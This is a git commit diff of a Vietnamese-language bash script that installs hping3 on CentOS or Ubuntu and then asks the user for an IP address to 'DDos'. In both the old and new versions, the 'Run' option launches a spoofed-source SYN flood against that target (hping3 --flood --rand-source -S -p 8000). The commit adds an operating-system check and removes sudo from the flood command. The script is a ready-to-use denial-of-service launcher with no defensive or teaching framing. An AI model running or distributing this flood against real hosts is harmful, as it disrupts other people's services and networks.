f97f45e0c37444a576814ec133e0810d0b22e61e
dominhtan <85058029+dominhtan@users.noreply.github.com>
2021-06-23 02:02:45 +0700

    Update hping3.sh

--- hping3.sh
+++ hping3.sh
@@ -1,58 +1,62 @@
 #!/bin/bash
 clear
 PS3="Chọn hệ điều hành Linux để cài hping3 :"
-opt=("Centos" "Ubuntu" "Check HDH" "Exit")
+opt=("Centos" "Ubuntu" "Exit")
 select menu in "${opt[@]}"
 do
         case $menu in
         "Centos")
-        opt1=("Setup" "Run" " "Exit")
-        select menu1 in "${opt1[@]}"
-        do
-                case $menu1 in
+        if (`cat /etc/os-release | grep -q 'CentOS'`); then
+                echo Hệ điều hành của bạn là : CentOS
+                cat /etc/os-release | head -5
+                        opt1=("Setup" "Run" "Exit")
+                select menu1 in "${opt1[@]}"
+                do
+                        case $menu1 in
                 "Setup")
-                        echo " Tiến trình đang chạy "
+                        echo " Đang cài đặt Hping3.. "
                         sudo yum install hping3 -y
                 ;;
                 "Run")
-                printf " Điền IP cần DDos : "
+                        printf " Điền IP cần DDos : "
                 read n
-                sudo hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
+                hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
                 ;;
                 "Exit")
-                echo "$REPLY"
+                exit
                 ;;
-        esac
-        done
+                esac
+                done
+        else
+                echo Hệ điều hành của bạn không phải CentOS $REPLY
+        exit
+fi
         ;;
         "Ubuntu")
-        opt2=("Setup" "Run" "Exit")
-        select menu2 in "${opt2[@]}"
-        do
-                case $menu2 in
+        if (`cat /etc/os-release | grep -q 'Ubuntu'`); then
+                echo Hệ điều hành của bạn là : Ubuntu
+                cat /etc/os-release | head -2
+                       opt2=("Setup" "Run" "Exit")
+                select menu2 in "${opt2[@]}"
+                do
+                        case $menu2 in
                 "Setup")
-                        echo " Tiến trình đang chạy "
+                        echo " Đang cài đặt Hping3.. "
                         sudo apt-get install hping3 -y
-                 ;;
+                ;;
                 "Run")
-                printf " Điền IP cần DDos : "
+                        printf " Điền IP cần DDos : "
                 read n
-                sudo hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
+                        hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
                 ;;
                 "Exit")
-                echo "$REPLY"
+                exit
                 ;;
-        esac
-        done
-        ;;
-        "Check HDH")
-                echo " Hệ điều hành bạn đang sử dụng :"
-                cat /etc/os-release
-        ;;
-        "Exit")
-                break
-        ;;
-        *) echo "Vui lòng thử lại $REPLY"
-;;
+                esac
+                done
+        else
+                echo Hệ điều hành của bạn không phải Ubuntu $REPLY
+        exit
+fi
 esac
 done
